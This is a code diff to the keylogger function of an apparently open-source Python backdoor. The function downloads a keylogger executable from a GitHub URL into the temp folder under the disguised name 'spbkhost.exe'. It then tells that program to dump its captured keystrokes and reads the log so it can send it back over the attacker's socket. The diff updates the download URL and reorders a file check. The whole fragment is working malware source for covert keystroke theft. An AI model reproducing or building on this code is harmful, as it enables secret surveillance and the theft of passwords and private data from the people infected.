@@ -298,7 +298,7 @@ def keylogger(option):
     if option == "start":
         if not os.path.isfile(TMP + "/spbkhost.exe"):
             try:
-                urllib.request.urlretrieve("https://github.com/xp4xbox/Simple-Python-Backdoor/blob/master/keylogger/keylogger?raw=true", TMP + "/spbkhost.exe")
+                urllib.request.urlretrieve("https://github.com/xp4xbox/Python-Backdoor/blob/master/keylogger/keylogger?raw=true", TMP + "/spbkhost.exe")
             except:  # if the file cannot be downloaded
                 objSocket.send(str.encode("error"))
                 return
@@ -317,15 +317,17 @@ def keylogger(option):
         if not b"spbkhost.exe" in command:  # check if keylogger is running
             objSocket.send(str.encode("error"))
             return
-        elif not os.path.isfile(TMP + "/spbky.txt"):
-            objSocket.send(str.encode("error2"))
-            return
 
         objSettings = open(TMP + "/spbky.txt", "w")
         objSettings.write("dump")  # give signal to dump
         objSettings.close()
 
         time.sleep(2)
+
+        if not os.path.isfile(TMP + "/spblog.txt"):
+            objSocket.send(str.encode("error2"))
+            return
+
         objTxtFile = open(TMP + "/spblog.txt", "r")  # read logs
         strLogs = objTxtFile.read()
 
